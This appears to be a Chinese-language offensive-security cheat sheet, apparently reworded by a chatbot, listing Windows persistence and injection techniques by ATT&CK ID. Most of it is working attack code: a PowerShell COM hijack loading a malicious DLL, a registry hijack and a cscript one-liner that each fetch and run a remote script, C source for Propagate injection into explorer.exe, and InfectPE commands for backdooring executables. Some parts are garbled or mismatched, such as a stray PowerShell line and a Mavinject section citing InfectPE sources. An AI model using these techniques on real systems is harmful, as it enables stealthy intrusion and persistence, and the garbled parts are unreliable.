以下是优化后的文本，使其更加清晰、连贯和专业：

---

### COM 劫持 (T1122) - Component Object Model Hijacking 示例

#### 示例 1
```powershell
# 静默处理错误并忽略输出
SilentlyContinue | Out-Null

# 创建注册表项
New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}" | Out-Null
New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" | Out-Null
New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" | Out-Null

# 设置注册表项属性
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "(default)" -Value $Payload | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "ThreadingModel" -Value "Apartment" | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "LoadWithoutCOM" -Value "" | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "HideOnDesktop" -Value "" | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "Attributes" -Value 0xf090013d -PropertyType DWORD | Out-Null

# 强制 Internet Explorer 加载恶意 DLL 并执行
$shellWinGuid = [System.Guid]::Parse("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
$typeShwin = [System.Type]::GetTypeFromCLSID($shellWinGuid)
$shwin = [System.Activator]::CreateInstance($typeShwin) | ? { $_.FullName -match 'ie xplore' } | Select-Object -First 1
$shWin.Navigate2("shell:::{$CLSID}", 2048)
```
参考资料:
- [https://ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse](https://ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse)
- 视频: [https://www.ggsec.cn/comhijack2.html](https://www.ggsec.cn/comhijack2.html)

#### 示例 2
```reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\setup]
@="rundll32 xwizards.dll,RunPropertySheet /u {00000001-0000-0000-0000-0000FEEDACDC}"
"COM Hijacking"=""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary]
@=""
[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary\CLSID]
@="{00000001-0000-0000-0000-0000FEEDACDC}"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}]
@="Scripting.Dictionary"
[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32]
@="C:\\WINDOWS\\system32\\scrobj.dll"
"ThreadingModel"="Apartment"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]
@="Scripting.Dictionary"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]
@="https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]
@="Scripting.Dictionary"
```
参考资料:
- [https://twitter.com/harr0ey/status/1137443710197817344](https://twitter.com/harr0ey/status/1137443710197817344)

#### 示例 3
参考资料:
- [https://www.bleepingcomputer.com/news/security/windows-10-ransomware-protection-bypassed-using-dll-injection/](https://www.bleepingcomputer.com/news/security/windows-10-ransomware-protection-bypassed-using-dll-injection/)

#### 示例 4
参考资料:
- [https://github.com/3gstudent/test/blob/master/calcmutex.dll](https://github.com/3gstudent/test/blob/master/calcmutex.dll)

### 进程注入 (T1055, TA0005, TA0004)

#### Propagate
适用于 Windows 7 和 10，但不进行错误检查，可能导致 explorer.exe 崩溃或其他意外行为。

```c
VOID propagate(LPVOID payload, DWORD payloadSize) {
    HANDLE hp, p;
    DWORD id;
    HWND pwh, cwh;
    SUBCLASS_HEADER sh;
    LPVOID psh, pfnSubclass;
    SIZE_T rd, wr;

    // 1. 获取父窗口句柄
    pwh = FindWindow(L"Progman", NULL);

    // 2. 获取子窗口句柄
    cwh = FindWindowEx(pwh, NULL, L"SHELLDLL_DefView", NULL);

    // 3. 获取子类标题的句柄
    p = GetProp(cwh, L"UxSubclassInfo");

    // 4. 获取 explorer.exe 的进程 ID
    GetWindowThreadProcessId(cwh, &id);

    // 5. 打开 explorer.exe
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 6. 读取当前子类标题
    ReadProcessMemory(hp, (LPVOID)p, &sh, sizeof(sh), &rd);

    // 7. 为新的子类标题分配 RW 内存
    psh = VirtualAllocEx(hp, NULL, sizeof(sh), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    // 8. 为有效负载分配 RWX 内存
    pfnSubclass = VirtualAllocEx(hp, NULL, payloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 9. 将 payload 写入内存
    WriteProcessMemory(hp, pfnSubclass, payload, payloadSize, &wr);

    // 10. 将 pfnSubclass 字段设置为有效负载地址，并写回处理内存
    sh.CallArray[0].pfnSubclass = (SUBCLASSPROC)pfnSubclass;
    WriteProcessMemory(hp, psh, &sh, sizeof(sh), &wr);

    // 11. 使用 SetProp
    SetProp(cwh, L"UxSubclassInfo", psh);

    // 12. 通过窗口消息触发 payload
    PostMessage(cwh, WM_CLOSE, 0, 0);

    // 13. 恢复原始子类标题
    SetProp(cwh, L"UxSubclassInfo", p);

    // 14. 释放内存并关闭句柄
    VirtualFreeEx(hp, psh, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, pfnSubclass, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}
```

参考资料:
- [https://github.com/odzhan/injection](https://github.com/odzhan/injection)
- [https://modexp.wordpress.com/2018/08/23/process-injection-propagate/](https://modexp.wordpress.com/2018/08/23/process-injection-propagate/)

#### InfectPE
```bash
.\InfectPE.exe .\input.exe .\out.exe code X
# 代码被注入到代码段，这种方法更隐蔽，但有时代码段中没有足够的空间。

.\InfectPE.exe .\input.exe .\out.exe largest X
# 代码被注入到零个数最多的部分，可以注入更大的 x 代码。该方法修改了该部分的特征，更加可疑。

.\InfectPE.exe .\input.exe .\out.exe resize
# 展开代码段的大小并注入 x 代码。这种技术不太可疑，也可以注入更大的 x 代码。

.\InfectPE.exe .\input.exe .\out.exe new
# 创建一个新的部分并向其中注入 x 代码，该部分的硬编码名称是 ".infect"。
```
在补丁文件中，ASLR 和 NX 被禁用，您可以分析 VS 项目的更多技术信息。请不要使用打包或格式不正确的可执行文件。

参考资料:
- [https://github.com/secrary/InfectPE](https://github.com/secrary/InfectPE)
- [https://www.microsoft.com/en-us/download/details.aspx?id=53840](https://www.microsoft.com/en-us/download/details.aspx?id=53840)
- 视频内容: [https://www.ggsec.cn/InfectPE.html](https://www.ggsec.cn/InfectPE.html)

### 40. cscript (TA0002, TA0005, T1216)
```powershell
cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost "script:https://gist.githubusercontent.com/enigma0x3/2e4f571fe76715640d0f8126f321ba07/raw/73c962d65059a211b5d7ea212e9a1054d632622b/new.txt"
```

### 41. Mavinject (T1218)
#### DLL 注入
DLL 注入是将 DLL 注入进程的内存空间，然后将其作为其一部分执行的过程。这样做意味着 DLL 代码具有对进程内存的所有访问权限，并且获得了进程的所有权限。例如，您希望与外界通信，但您没有通过防火墙的权限。通过注入 DLL，您可以注入并执行您的代码到具有权限的进程中（如 Internet Explorer），从而能够执行所需的操作。

参考资料:
- [https://github.com/secrary/InfectPE](https://github.com/secrary/InfectPE)
- [https://www.microsoft.com/en-us/download/details.aspx?id=53840](https://www.microsoft.com/en-us/download/details.aspx?id=53840)
- 视频内容: [https://www.ggsec.cn/InfectPE.html](https://www.ggsec.cn/InfectPE.html)

---

这样优化后的文本结构更加清晰，逻辑更加连贯，同时保持了专业的风格。